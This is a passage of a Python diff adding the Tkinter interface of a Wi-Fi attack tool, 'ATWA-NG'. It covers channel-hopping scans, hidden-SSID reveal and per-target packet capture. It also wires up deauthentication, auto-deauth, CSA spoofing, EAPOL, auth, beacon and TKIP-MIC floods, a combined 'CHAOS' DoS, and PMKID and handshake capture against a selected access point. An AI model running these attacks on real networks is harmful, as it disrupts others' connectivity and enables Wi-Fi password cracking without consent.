+    def _start_scan(self):
+        if not self.mon_iface:
+            messagebox.showwarning("ATWA-NG", "Start monitor mode first.")
+            return
+        if self._scanning.is_set():
+            return
+        self._scanning.set()
+        self._scan_generation += 1
+        generation = self._scan_generation
+        self._log("scanning started")
+
+        def loop():
+            import time
+
+            from ..dissect import dissect
+            from ..radio import ALL_CHANNELS, ChannelHopper, check_and_heal
+            from ..scan import RawFrameSniffer, ScanResult, process_packet
+
+            # One persistent hopper for the whole scanning session, not a
+            # fresh one per pass — matches how the compiled scan engine actually works
+            # (confirmed via --help: one continuous hop loop, incremental
+            # display, never restarts). The old design called scan() in a
+            # loop, which builds a brand-new ChannelHopper every time — its
+            # channel index always restarted at 0, so with hop() costing a
+            # full dwell itself (0.3s) *plus* the 0.3s sniff (0.6s/channel,
+            # 13.2s for a full 22-channel sweep), a short bounded duration
+            # never reached 5GHz at all, not just less often. process_packet
+            # already merges correctly into a persistent ScanResult (fixed
+            # 2026-08-19), so this also drops the GUI's own duplicate merge
+            # logic that used to sit here.
+            result = ScanResult(aps=self.aps)
+            hopper = ChannelHopper(iface=self.mon_iface, channels=self._scan_channels or list(ALL_CHANNELS))
+
+            def on_packet(raw):
+                frame = dissect(raw)
+                bssid = frame.addr3 if frame else None
+                had_ssid = result.aps[bssid].ssid if bssid in result.aps else None
+                process_packet(raw, result, own_mac=self.own_mac, frame=frame)
+                if bssid and bssid in result.aps and not had_ssid and result.aps[bssid].ssid:
+                    self._log(f"revealed hidden SSID: {result.aps[bssid].ssid} ({bssid})")
+
+            def start_sniffer():
+                s = RawFrameSniffer(iface=self.mon_iface, prn=on_packet)
+                s.start()
+                return s
+
+            # ONE persistent capture socket for the whole scanning session,
+            # not a fresh sniff() opened and closed every single hop -- the
+            # exact same bug scan.py's own scan() function already fixed
+            # (per-hop sniff() flaps promiscuous mode in lockstep with the
+            # dwell timer on some drivers, confirmed live via dmesg, eating
+            # into the listening window every hop and occasionally raising
+            # a real ENETDOWN from the socket churn), just never ported into
+            # the GUI's own loop until now. hopper.hop() already sleeps for
+            # the dwell period itself, so this also drops the old code's
+            # redundant *second* dwell-length wait from the per-hop
+            # sniff(timeout=hopper.dwell) call -- a full channel sweep now
+            # takes roughly half as long as before.
+            try:
+                sniffer = start_sniffer()
+            except Exception as exc:  # noqa: BLE001 - transient driver errors must not kill the scan loop
+                self._log(f"scan capture failed to start, retrying: {exc}")
+                sniffer = None
+
+            # Periodic self-healing check (2026-09-04, roadmap item):
+            # NetworkManager reasserting control, a driver reset, or
+            # anything else knocking mon_iface back to managed mid-session
+            # doesn't always kill the sniffer thread -- a raw AF_PACKET
+            # socket can sit there "alive" on a managed-mode interface
+            # receiving nothing useful, silently, with no exception and no
+            # crash to trigger the dead-sniffer restart below. Checked on a
+            # timer rather than every hop to avoid an `iw` subprocess call
+            # every 0.3s dwell.
+            last_health_check = 0.0
+            HEALTH_CHECK_INTERVAL = 10.0
+
+            try:
+                while self._scanning.is_set() and generation == self._scan_generation:
+                    now = time.monotonic()
+                    if now - last_health_check >= HEALTH_CHECK_INTERVAL:
+                        last_health_check = now
+                        # check_and_heal() has no exception handling of its own --
+                        # every call inside it (get_mode/get_channel/set_channel)
+                        # raises RadioError straight through on any iw/ip failure.
+                        # This whole loop body sits in a try/finally with no
+                        # except, so an unguarded call here (a transient USB
+                        # hiccup, the adapter being briefly busy, ...) used to
+                        # propagate out of loop() entirely and silently kill
+                        # self._scan_thread -- self._scanning never gets cleared
+                        # since only Stop Scan does that, so the GUI kept showing
+                        # "scanning" while nothing was actually happening anymore
+                        # (2026-09-12 user report: "the scan eventually just
+                        # stops"). Caught and logged here instead, same
+                        # self-heal-don't-crash treatment this loop already gives
+                        # every other failure mode (dead sniffer, failed restart).
+                        try:
+                            healed = check_and_heal(self.mon_iface)
+                        except Exception as exc:  # noqa: BLE001
+                            self._log(f"health check failed, will retry next cycle: {exc}")
+                            healed = []
+                        for action in healed:
+                            self._log(action)
+                        if healed and sniffer is not None:
+                            # Healing cycles the interface down/up -- the
+                            # existing capture socket is no longer valid.
+                            try:
+                                sniffer.stop()
+                            except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
+                                pass
+                            sniffer = None
+                    if sniffer is None or not sniffer.thread or not sniffer.thread.is_alive():
+                        # The socket died underneath us (e.g. the transient
+                        # "[Errno 100] Network is down" seen on some drivers
+                        # during a fast band switch) -- restart it rather
+                        # than silently scanning with no capture at all.
+                        # AsyncSniffer._run_catch swallows every exception
+                        # from inside the sniffing thread into .exception and
+                        # lets the thread exit "cleanly" -- without reading
+                        # it here, a dead-on-arrival socket (bad iface state,
+                        # permission error, BPF filter rejected because the
+                        # iface isn't actually in monitor mode, ...) restarts
+                        # forever with zero indication of why.
+                        if sniffer is not None and sniffer.exception is not None:
+                            self._log(f"scan capture socket died: {sniffer.exception}")
+                        try:
+                            for action in check_and_heal(self.mon_iface):
+                                self._log(action)
+                        except Exception as exc:  # noqa: BLE001 -- see the other check_and_heal() call above for why this must not propagate
+                            self._log(f"health check failed, will retry next cycle: {exc}")
+                        try:
+                            sniffer = start_sniffer()
+                            self._log("scan capture socket (re)started")
+                        except Exception as exc:  # noqa: BLE001
+                            self._log(f"scan capture restart failed, retrying: {exc}")
+                            sniffer = None
+                            time.sleep(0.5)
+                            continue
+                    # An attack (deauth/capture/PMKID/WPS/PINCER/auto-deauth)
+                    # needs exclusive use of mon_iface's channel. Pause
+                    # hopping while busy instead of fighting an attack over
+                    # which channel the radio is parked on; the persistent
+                    # sniffer keeps passively receiving on whatever channel
+                    # is currently set either way, so scan data isn't lost.
+                    if self._busy:
+                        time.sleep(0.3)
+                        continue
+                    # Locked/unlocked can change mid-session (double-click a
+                    # different target, hit Unlock) — pick that up each hop
+                    # rather than only at loop start.
+                    wanted = self._scan_channels or list(ALL_CHANNELS)
+                    if hopper.channels != wanted:
+                        hopper.channels = wanted
+                    hopper.hop()
+                    if self.locked_bssid and self.locked_bssid in result.aps:
+                        self._lock_lost_since = None
+                    # Signal graph follows whatever's SELECTED, not just locked
+                    # (2026-08-26 live-test note: single-click a row should
+                    # immediately start updating the graph, not just after a
+                    # double-click lock — selected_bssid equals locked_bssid
+                    # once you do lock, since selection fires with the click).
+                    if self.selected_bssid and self.selected_bssid in result.aps:
+                        # last_signal, not signal -- signal is a running best-ever
+                        # max (by design, for the target list/sort column), which
+                        # ratchets up once and then plateaus forever. Feeding that
+                        # into a rolling time graph made it look permanently stuck
+                        # after the first strong reading instead of tracking the
+                        # actual live RSSI.
+                        self._queue_signal_sample(result.aps[self.selected_bssid].last_signal)
+                    self._queue_scan_update()
+            finally:
+                if sniffer is not None:
+                    try:
+                        sniffer.stop()
+                    except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
+                        pass
+
+        self._scan_thread = threading.Thread(target=loop, daemon=True)
+        self._scan_thread.start()
+
+    def _stop_scan(self):
+        self._scanning.clear()
+        self._scan_generation += 1  # invalidate any loop thread still mid-dwell
+        self._log("scanning stopped")
+
+    def _matches_security_filter(self, ap: AccessPoint) -> bool:
+        filt = self.security_filter_var.get()
+        sec = (ap.security or "").lower()
+        if filt == "All":
+            return True
+        if filt == "Open":
+            return sec == "open"
+        if filt == "WEP":
+            return sec == "wep"
+        if filt == "WPA/WPA2":
+            return sec in ("wpa", "wpa2")
+        if filt == "WPA3":
+            return sec == "wpa3"
+        if filt == "Transition":
+            return sec == "transition"
+        return True
+
+    def _render_targets(self):
+        selected = self.selected_bssid
+        self.tree.delete(*self.tree.get_children())
+        # list(...) snapshots self.aps before iterating -- the scan thread
+        # adds new APs to this same dict concurrently, and iterating the
+        # live dict directly raised "dictionary changed size during
+        # iteration" here (confirmed live, 2026-08-28).
+        rows = [ap for ap in list(self.aps.values()) if self._matches_security_filter(ap)]
+
+        if self._sort_col is None:
+            rows.sort(key=lambda ap: ap.bssid)
+        else:
+            key_fn = {
+                "bssid": lambda ap: ap.bssid,
+                "ssid": lambda ap: (ap.ssid or "").lower(),
+                "channel": lambda ap: ap.channel if ap.channel is not None else -1,
+                "security": lambda ap: ap.security or "",
+                "pmf": lambda ap: ap.pmf or "",
+                "wps": lambda ap: ap.wps or "",
+                "signal": lambda ap: ap.signal if ap.signal is not None else -999,
+            }[self._sort_col]
+            rows.sort(key=key_fn, reverse=self._sort_reverse)
+
+        wps_display = {"enabled": "yes", "locked": "locked"}
+        for i, ap in enumerate(rows):
+            band_tag = "row_even" if i % 2 == 0 else "row_odd"
+            self.tree.insert("", tk.END, iid=ap.bssid, values=(
+                ap.bssid, self._display_ssid(ap.ssid) if ap.ssid else "<hidden>", ap.channel or "-", ap.security or "-",
+                ap.pmf or "-", wps_display.get(ap.wps, "-"), ap.signal if ap.signal is not None else "-",
+            ), tags=((ap.security or "unknown").lower(), band_tag))
+        if selected and self.tree.exists(selected):
+            self.tree.selection_set(selected)
+        self._autosize_target_columns()
+
+    def _autosize_target_columns(self):
+        """Column width = actual longest rendered value (header or any
+        current row), not a hardcoded guess -- fixes BSSID needing a manual
+        drag every time to stop clipping its last couple characters, and CH
+        sitting on wasted space while other columns are tight (2026-09-08
+        user report). Recomputed on every render since content changes
+        (new APs discovered, SSIDs resolved from hidden to real)."""
+        font = self.fonts["mono"]
+        pad = 24  # heading sort-arrow (▲/▼ + space) plus Treeview's own cell padding
+        for key, heading, _default_width in TARGET_COLUMNS:
+            widest = font.measure(f"{heading} ▼")  # account for the sort-arrow suffix even when not currently sorted by this column
+            for iid in self.tree.get_children():
+                widest = max(widest, font.measure(str(self.tree.set(iid, key))))
+            self.tree.column(key, width=widest + pad)
+
+    def _on_tree_heading_press(self, event):
+        region = self.tree.identify_region(event.x, event.y)
+        self._drag_press_col = self.tree.identify_column(event.x) if region == "heading" else None
+
+    def _on_tree_heading_release(self, event):
+        """Same column released as pressed -> plain click -> sort (what
+        ttk's own heading command= used to do). Different column -> the
+        user dragged one heading onto another -> swap their display order
+        instead. See the binding-site comment for why both live in one
+        handler rather than ttk's command= plus a separate drag binding."""
+        pressed = self._drag_press_col
+        self._drag_press_col = None
+        region = self.tree.identify_region(event.x, event.y)
+        if pressed is None or region != "heading":
+            return
+        released = self.tree.identify_column(event.x)
+        if released == pressed:
+            col = self._displaycolumn_to_key(pressed)
+            if col:
+                self._on_target_heading_click(col)
+        else:
+            self._reorder_columns(pressed, released)
+
+    def _displaycolumn_to_key(self, display_id: str) -> str | None:
+        """identify_column() returns '#N' (1-indexed position among
+        currently VISIBLE columns) -- map that back to a real column key."""
+        try:
+            idx = int(display_id.replace("#", "")) - 1
+        except ValueError:
+            return None
+        displaycols = list(self.tree["displaycolumns"])
+        return displaycols[idx] if 0 <= idx < len(displaycols) else None
+
+    def _reorder_columns(self, from_display_id: str, to_display_id: str):
+        """Swap two columns' positions (drag one heading onto another).
+        Persisted the same way hidden_columns already is, via
+        _save_settings()."""
+        displaycols = list(self.tree["displaycolumns"])
+        from_key = self._displaycolumn_to_key(from_display_id)
+        to_key = self._displaycolumn_to_key(to_display_id)
+        if from_key is None or to_key is None:
+            return
+        from_idx, to_idx = displaycols.index(from_key), displaycols.index(to_key)
+        displaycols[from_idx], displaycols[to_idx] = displaycols[to_idx], displaycols[from_idx]
+        self.tree["displaycolumns"] = displaycols
+        self.column_order = displaycols
+
+    def _on_target_heading_click(self, col: str):
+        """Click a column heading to sort by it; click again to reverse."""
+        numeric_cols = {"channel", "signal"}
+        if self._sort_col == col:
+            self._sort_reverse = not self._sort_reverse
+        else:
+            self._sort_col = col
+            self._sort_reverse = col in numeric_cols
+        for key, heading, _width in TARGET_COLUMNS:
+            if self._sort_col == key:
+                arrow = "▼" if self._sort_reverse else "▲"
+                self.tree.heading(key, text=f"{heading} {arrow}")
+            else:
+                self.tree.heading(key, text=heading)
+        self._render_targets()
+
+    def _on_target_right_click(self, event):
+        region = self.tree.identify_region(event.x, event.y)
+        if region == "heading":
+            self._show_column_menu(event)
+            return
+        row = self.tree.identify_row(event.y)
+        if not row:
+            return
+        self.tree.selection_set(row)
+        self.root.clipboard_clear()
+        self.root.clipboard_append(row)
+        self.status_var.set(f"Copied BSSID {row} to clipboard")
+
+    def _on_client_right_click(self, event):
+        row = self.client_tree.identify_row(event.y)
+        if not row:
+            return
+        self.client_tree.selection_set(row)
+        menu = tk.Menu(self.root, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        menu.add_command(label="Deauth This Client", command=self._attack_deauth_client)
+        menu.add_command(
+            label="Auto-Deauth This Client",
+            command=lambda client=row: self._start_client_auto_deauth(client),
+        )
+        menu.add_command(label="Copy MAC", command=lambda: self._copy_to_clipboard(row))
+        menu.tk_popup(event.x_root, event.y_root)
+
+    def _copy_to_clipboard(self, text: str):
+        self.root.clipboard_clear()
+        self.root.clipboard_append(text)
+        self.status_var.set(f"Copied {text} to clipboard")
+
+    def _apply_column_visibility(self):
+        """displaycolumns, not width=0 — a zero-width column is still a
+        clickable sliver in ttk.Treeview, this actually removes it.
+
+        Order comes from self.column_order (user drag-reordering, see
+        _reorder_columns) with any column missing from it (never dragged
+        yet, or newly added to TARGET_COLUMNS in a future version) appended
+        at its default TARGET_COLUMNS position -- so a column can never
+        silently disappear just because it's absent from a saved order."""
+        order = self.column_order + [key for key, _, _ in TARGET_COLUMNS if key not in self.column_order]
+        visible = [key for key in order if key not in self.hidden_columns]
+        self.tree["displaycolumns"] = visible
+
+    def _show_column_menu(self, event):
+        """Right-click a column header to show/hide it (deferred earlier
+        since it wanted settings persistence first — now wired to it).
+        BSSID stays pinned, it's the row identity, same as it's excluded
+        from sorting."""
+        menu = tk.Menu(self.root, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        for key, heading, _width in TARGET_COLUMNS:
+            if key == "bssid":
+                continue
+            var = tk.BooleanVar(value=key not in self.hidden_columns)
+
+            def toggle(key=key, var=var):
+                if var.get():
+                    self.hidden_columns.discard(key)
+                else:
+                    self.hidden_columns.add(key)
+                self._apply_column_visibility()
+
+            menu.add_checkbutton(label=heading, variable=var, command=toggle)
+        menu.tk_popup(event.x_root, event.y_root)
+
+    def _on_target_select(self, _event=None):
+        """Fires on both a real user click AND _render_targets()'s own
+        tree.selection_set(selected) call that restores the selection
+        after every scan-update redraw -- ttk.Treeview refires
+        <<TreeviewSelect>> on selection_set() even when the selection
+        didn't change. Without the is_new_bssid guard below, that meant
+        signal_graph.reset() ran on every single scan tick, wiping the
+        history back down to one seeded sample every time -- the graph
+        could never show more than a single (moving) dot (2026-08-27 user
+        report)."""
+        sel = self.tree.selection()
+        if not sel:
+            return
+        bssid = sel[0]
+        self.selected_bssid = bssid
+        ap = self.aps.get(bssid)
+        if not ap:
+            return
+        is_new_bssid = bssid != self._last_graphed_bssid
+        self._last_graphed_bssid = bssid
+        self.target_title_var.set(f"{ap.ssid or '<hidden>'}  ({bssid})")
+        self.target_detail_var.set(
+            f"BSSID: {bssid}\n"
+            f"Manufacturer: {ap.manufacturer or '-'}\n"
+            f"Channel: {ap.channel or '-'}\n"
+            f"Security: {ap.security or '-'}\n"
+            f"PMF: {ap.pmf or '-'}\n"
+            f"Signal: {ap.signal if ap.signal is not None else '-'} dBm\n"
+            f"RX quality: {ap.rx_quality}%\n"
+            f"Clients seen: {len(ap.clients)}"
+            + (f"\nPMKID (passively sniffed): {ap.pmkid}" if ap.pmkid else "")
+        )
+        # _on_target_select refires on every scan-tick redraw (see docstring
+        # above), not just on a real click. Blindly delete()+insert()ing the
+        # client_tree every time wiped the user's row selection out from
+        # under them on the very next scan hop -- clicking a client above/
+        # below the currently-selected one looked "stuck" because any
+        # selection made between two ticks got destroyed before it could be
+        # acted on. Only touch the tree structure when the client set
+        # actually changed; otherwise just refresh signal values in place
+        # and leave the existing selection alone. When it does change,
+        # carry the previous selection forward if that client is still present.
+        current_ids = self.client_tree.get_children()
+        current_set = set(current_ids)
+        new_set = set(ap.clients)
+        if current_set == new_set:
+            for mac in current_ids:
+                signal = ap.client_signal.get(mac)
+                self.client_tree.item(mac, values=(mac, signal if signal is not None else "-"))
+        else:
+            # Re-sorting the whole list alphabetically on every rebuild (the
+            # old behavior) relocated existing rows on every client-set
+            # change -- on a busy AP that's most scan ticks. A click and a
+            # rebuild landing close together then raced: the row under the
+            # cursor when the click registered wasn't necessarily the row
+            # the user saw, and one MAC would appear permanently "stuck"
+            # selected (2026-09-13 live-test report). Keep existing rows in
+            # their existing order -- never relocate a row once inserted --
+            # and only append newly-seen clients at the end.
+            prev_selection = self.client_tree.selection()
+            kept_ids = [mac for mac in current_ids if mac in new_set]
+            added_ids = sorted(mac for mac in new_set if mac not in current_set)
+            new_ids = kept_ids + added_ids
+            self.client_tree.delete(*current_ids)
+            for i, mac in enumerate(new_ids):
+                signal = ap.client_signal.get(mac)
+                band_tag = "row_even" if i % 2 == 0 else "row_odd"
+                self.client_tree.insert(
+                    "", tk.END, iid=mac, values=(mac, signal if signal is not None else "-"), tags=(band_tag,),
+                )
+            still_present = [mac for mac in prev_selection if mac in new_set]
+            if still_present:
+                self.client_tree.selection_set(still_present)
+
+        if not is_new_bssid:
+            return
+        # Seed with the last-known signal so the graph isn't empty while
+        # waiting for the next scan hop to land on this AP's channel.
+        self.signal_graph.reset()
+        if ap.last_signal is not None:
+            self.signal_graph.add_sample(ap.last_signal)
+        self._start_selected_capture_watch(ap)
+        if ap.channel:
+            self._lock_channel(ap)
+
+    def _start_selected_capture_watch(self, ap: AccessPoint):
+        """Live KB readout of any existing capture data for the selected
+        target. Reads whatever's already on disk; a running attack's own
+        _watch_capture_size call takes priority and this backs
+        off (checked via self._busy) so the two don't fight over the same
+        capture_size_var."""
+        if self._select_capture_watch_stop is not None:
+            self._select_capture_watch_stop.set()
+        stop_event = threading.Event()
+        self._select_capture_watch_stop = stop_event
+
+        from ..storage import target_capture_dir
+
+        capture_dir = target_capture_dir(ap.ssid, ap.bssid, create=False)
+
+        def watch():
+            while not stop_event.is_set():
+                if not self._busy:
+                    try:
+                        size = sum(f.stat().st_size for f in capture_dir.glob("**/*") if f.is_file()) \
+                            if capture_dir.exists() else 0
+                    except OSError:
+                        size = 0
+                    self._queue.put(("capture_size", size))
+                stop_event.wait(1)
+
+        threading.Thread(target=watch, daemon=True).start()
+
+    def _on_target_double_click(self, _event=None):
+        """Redundant with single-click since 2026-08-26 (select now locks
+        too, see _on_target_select) — harmless no-op re-lock, kept so
+        double-click still does something sensible rather than nothing."""
+        bssid = self.selected_bssid
+        if not bssid:
+            return
+        ap = self.aps.get(bssid)
+        if ap and ap.channel:
+            self._lock_channel(ap)
+
+    def _selected_client(self) -> str | None:
+        sel = self.client_tree.selection()
+        return sel[0] if sel else None
+
+    def _lock_channel(self, ap: AccessPoint):
+        """Stop hopping and park the adapter on ap's channel. Also
+        starts a native packet capture restricted to this bssid so the
+        capture-size KB readout actually grows from real on-disk data,
+        not just a static existing-file check."""
+        if self.channel_locked and self.locked_bssid == ap.bssid and self._lock_capture_proc is not None:
+            return  # already locked to this exact target with a live capture running
+        if ap.channel is None:
+            self._log(f"No channel known for {ap.bssid}; cannot lock")
+            return
+        self.channel_locked = True
+        self.locked_bssid = ap.bssid
+        self.locked_channel = ap.channel
+        self._lock_lost_since = None
+        self._scan_channels = [ap.channel]
+        # No reset here: _on_target_select already reset+seeded the graph
+        # for this same bssid (selection always fires before/with the
+        # double-click that reaches this method) — resetting again would
+        # just throw away that seed point for no reason.
+        self.channel_lock_var.set(f"🔒 Locked to CH {ap.channel}")
+        self.lock_status_label.configure(fg=self.THEME["accent"])
+        self._log(f"Locked to channel {ap.channel} for {ap.ssid or '<hidden>'} ({ap.bssid})")
+        if self.mon_iface and "demo" not in self.mon_iface:
+            def work():
+                from ..radio import ensure_channel
+
+                ensure_channel(self.mon_iface, ap.channel)
+                return f"channel {ap.channel}"
+
+            self._run_bg(f"Set channel {ap.channel}", work)
+            # A client-less target can never yield a handshake (nothing to
+            # deauth/reconnect), so a continuous lock capture there is pure
+            # write-and-discard -- and single-click locking means every row
+            # glanced at while browsing starts one. Most of the folder-
+            # filling clutter was exactly this: dozens of near-empty
+            # lock_*.pcap files across networks the user never actually
+            # attacked, just scrolled past. Skip starting the capture
+            # entirely when no clients are known yet; if one shows up
+            # later while still locked, re-locking (e.g. Unlock + relock,
+            # or double-click) will pick it up.
+            if ap.clients:
+                self._start_lock_capture(ap)
+            else:
+                self._log(f"no clients seen yet on {ap.bssid} — skipping lock capture (nothing to record)")
+
+    def _start_lock_capture(self, ap: AccessPoint):
+        """Native AsyncSniffer-backed capture (lock_capture.LockCapture),
+        restricted to ap's bssid on the already-locked channel, writing
+        continuously to disk. Stopped by _unlock_channel/_stop_lock_capture."""
+        assert self.mon_iface is not None
+        self._stop_lock_capture()
+        import time as _time
+
+        from ..lock_capture import LockCapture
+        from ..storage import target_capture_dir
+
+        out_dir = target_capture_dir(ap.ssid, ap.bssid)
+        out_file = out_dir / f"lock_{int(_time.time())}.pcap"
+        try:
+            capture = LockCapture(self.mon_iface, ap.bssid, str(out_file))
+            capture.start()
+            self._lock_capture_proc = capture
+        except OSError as exc:
+            self._log(f"lock capture failed to start: {exc}")
+            self._lock_capture_proc = None
+
+    def _stop_lock_capture(self):
+        capture = self._lock_capture_proc
+        self._lock_capture_proc = None
+        if capture is None:
+            return
+        capture.stop()
+
+    def _unlock_channel(self):
+        """Resume hopping the full channel range."""
+        if not self.channel_locked:
+            return
+        self.channel_locked = False
+        self.locked_bssid = None
+        self.locked_channel = None
+        self._lock_lost_since = None
+        self._scan_channels = None
+        self._stop_lock_capture()
+        self.channel_lock_var.set("Scanning all channels")
+        self.lock_status_label.configure(fg=self.THEME["error"])
+        self._log("Channel lock released; scanning all channels")
+
+    def _check_channel_lock(self):
+        """Auto-unlock if the locked target hasn't been seen for CHANNEL_LOCK_TIMEOUT."""
+        if self.channel_locked and self.locked_bssid and self.locked_bssid not in self.aps:
+            import time
+
+            if self._lock_lost_since is None:
+                self._lock_lost_since = time.monotonic()
+            elif time.monotonic() - self._lock_lost_since > CHANNEL_LOCK_TIMEOUT:
+                self._log("Locked target hasn't been seen in 30s; channel lock auto-released")
+                self._unlock_channel()
+        self.root.after(5000, self._check_channel_lock)
+
+    def _require_target(self) -> AccessPoint | None:
+        if not self.selected_bssid or self.selected_bssid not in self.aps:
+            messagebox.showwarning("ATWA-NG", "Select a target from the scan list first.")
+            return None
+        if not self.mon_iface:
+            messagebox.showwarning("ATWA-NG", "Start monitor mode first.")
+            return None
+        return self.aps[self.selected_bssid]
+
+    # ------------------------------------------------------------------
+    # Attacks — every call below hits this project's own native implementation.
+    # ------------------------------------------------------------------
+    def _confirm_attack(self, title: str, detail: str) -> bool:
+        """Modal countdown confirm before firing an attack. Attacks are
+        native calls, not shell commands, so this shows a plain-English
+        summary instead of a literal command line. Auto-confirms at 0
+        unless Cancelled; Execute Now skips the wait. Blocks
+        (wait_window) until a choice is made."""
+        result = {"go": False}
+        dlg = tk.Toplevel(self.root)
+        dlg.title("Confirm Attack")
+        dlg.configure(bg=self.THEME["bg"])
+        dlg.transient(self.root)
+        dlg.grab_set()
+        dlg.resizable(False, False)
+
+        ttk.Label(dlg, text=title, style="Heading.TLabel").pack(padx=16, pady=(14, 4))
+        ttk.Label(dlg, text=detail, style="Muted.TLabel", justify=tk.LEFT, wraplength=380).pack(padx=16, pady=(0, 10))
+        count_var = tk.StringVar(value="Executing in 3...")
+        ttk.Label(dlg, textvariable=count_var, font=self.fonts["ui_bold"]).pack(pady=(0, 10))
+
+        remaining = [3]
+        after_id: list[str | None] = [None]
+
+        def go():
+            if after_id[0]:
+                dlg.after_cancel(after_id[0])
+            result["go"] = True
+            dlg.destroy()
+
+        def cancel():
+            if after_id[0]:
+                dlg.after_cancel(after_id[0])
+            result["go"] = False
+            dlg.destroy()
+
+        def tick():
+            remaining[0] -= 1
+            if remaining[0] <= 0:
+                go()
+                return
+            count_var.set(f"Executing in {remaining[0]}...")
+            after_id[0] = dlg.after(1000, tick)
+
+        btns = ttk.Frame(dlg)
+        btns.pack(pady=(0, 14))
+        ttk.Button(btns, text="Cancel", command=cancel, style="Danger.TButton").pack(side=tk.LEFT, padx=6)
+        ttk.Button(btns, text="Execute Now", command=go, style="Accent.TButton").pack(side=tk.LEFT, padx=6)
+
+        dlg.protocol("WM_DELETE_WINDOW", cancel)
+        after_id[0] = dlg.after(1000, tick)
+        dlg.wait_window()
+        return result["go"]
+
+    def _start_client_auto_deauth(self, client: str):
+        ap = self._require_target()
+        if not ap or client not in ap.clients:
+            return
+        if ap.pmf == "required":
+            messagebox.showwarning(
+                "ATWA-NG",
+                "PMF is required on this target, so deauthentication would be dropped.",
+            )
+            return
+        self.auto_deauth_var.set(True)
+        self._start_auto_deauth(ap, client)
+
+    def _attack_deauth_all(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack("Deauth All Clients", f"Send 64 deauth frames to ALL clients on {ap.bssid} ({ap.ssid or '<hidden>'})."):
+            return
+        self._run_bg(f"Deauth all clients on {ap.bssid}", self._runner().deauth_all, ap)
+
+    def _attack_deauth_client(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        client = self._selected_client()
+        if not client:
+            messagebox.showwarning("ATWA-NG", "No client selected — pick one from the Clients list.")
+            return
+        if not self._confirm_attack("Deauth Client", f"Send 64 deauth frames to {client} on {ap.bssid} ({ap.ssid or '<hidden>'})."):
+            return
+        self._run_bg(f"Deauth {client} on {ap.bssid}", self._runner().deauth_client, ap, client)
+
+    # ------------------------------------------------------------------
+    # DoS / protocol-disruption floods (v2.4)
+    # ------------------------------------------------------------------
+
+    def _attack_csa_spoof(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        from tkinter import simpledialog
+
+        new_channel = simpledialog.askinteger(
+            "ATWA-NG", "CSA Spoof: channel to tell clients to switch to:",
+            parent=self.root, minvalue=1, maxvalue=165,
+        )
+        if not new_channel:
+            return
+        client = self._selected_client()
+        target_desc = client or "broadcast (all clients)"
+        if not self._confirm_attack(
+            "CSA Spoof",
+            f"Send forged Channel Switch Announcement frames from {ap.bssid} telling "
+            f"{target_desc} to switch to channel {new_channel}. Protocol-level redirect, "
+            "not a disassociation — a client that honors it just silently retunes.",
+        ):
+            return
+        self._run_bg(
+            f"CSA spoof on {ap.bssid} -> ch{new_channel}",
+            self._runner().csa_spoof, ap, new_channel, client,
+        )
+
+    def _attack_eapol_flood(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack(
+            "EAPOL-Start Flood",
+            f"Flood {ap.bssid} ({ap.ssid or '<hidden>'}) with 100 EAPOL-Start frames from "
+            "randomized spoofed source MACs, attempting to exhaust its 802.1X session table.",
+        ):
+            return
+        self._run_bg(f"EAPOL-Start flood on {ap.bssid}", self._runner().eapol_flood, ap, 100)
+
+    def _attack_auth_flood(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack(
+            "Auth Flood",
+            f"Flood {ap.bssid} ({ap.ssid or '<hidden>'}) with 100 open-system authentication "
+            "requests from randomized spoofed source MACs, attempting to exhaust its "
+            "association table.",
+        ):
+            return
+        self._run_bg(f"Auth flood on {ap.bssid}", self._runner().auth_flood, ap, 100)
+
+    def _attack_beacon_flood(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack(
+            "Beacon Flood",
+            f"Broadcast 100 fake beacons (random BSSIDs/SSIDs) on channel "
+            f"{ap.channel or '<current>'} — noise to confuse client auto-connect / Wi-Fi "
+            f"scanners near {ap.bssid} ({ap.ssid or '<hidden>'}).",
+        ):
+            return
+        self._run_bg(f"Beacon flood (channel {ap.channel})", self._runner().beacon_flood, ap.channel, 100)
+
+    def _attack_tkip_mic_flood(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        client = self._selected_client()
+        target_desc = client or "broadcast"
+        if not self._confirm_attack(
+            "TKIP MIC Flood",
+            f"Send 2 synthetic bad-MIC frames to {ap.bssid} ({target_desc}) attempting to "
+            "trigger TKIP's Michael-MIC countermeasure (60s lockout + forced rekey).\n"
+            "Best-effort against a real receiver — see attacks/tkip_mic_flood.py's module "
+            "docstring for why this may not reliably trigger it; WPA2/WPA3-CCMP-only "
+            "networks are unaffected either way (TKIP-specific attack).",
+        ):
+            return
+        self._run_bg(f"TKIP MIC flood on {ap.bssid}", self._runner().tkip_mic_flood, ap, client)
+
+    def _attack_chaos(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        client = self._selected_client()
+        target_desc = client or "broadcast (all clients)"
+        if not self._confirm_attack(
+            "CHAOS Flood",
+            f"Run the full coordinated flood suite against {ap.bssid} "
+            f"({ap.ssid or '<hidden>'}) targeting {target_desc}:\n"
+            "six vectors (beacon, EAPOL, auth, deauth, CSA, TKIP-MIC) at three "
+            "escalating tiers (100/1000/5000 frames), with a 2s settle between "
+            "each vector so the effects don't contaminate each other.\n\n"
+            "Multi-vector DoS; runs for about a minute or more. Reports only "
+            "the vectors that produced an observable effect -- not frames sent. "
+            "Stop Attack aborts it between vectors.",
+        ):
+            return
+        self._run_bg(f"CHAOS flood on {ap.bssid}", self._runner().chaos, ap, client)
+
+    def _attack_pmkid(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self.own_mac:
+            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
+            return
+        if not self._confirm_attack("PMKID Attack", f"Clientless PMKID capture against {ap.bssid} ({ap.ssid or '<hidden>'})."):
+            return
+        self._run_bg(f"PMKID attack on {ap.bssid}", self._runner().pmkid, ap)
+
+    def _attack_handshake(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack("Handshake Capture", f"Sniff EAPOL on {ap.bssid} ({ap.ssid or '<hidden>'}) for up to 60s."):
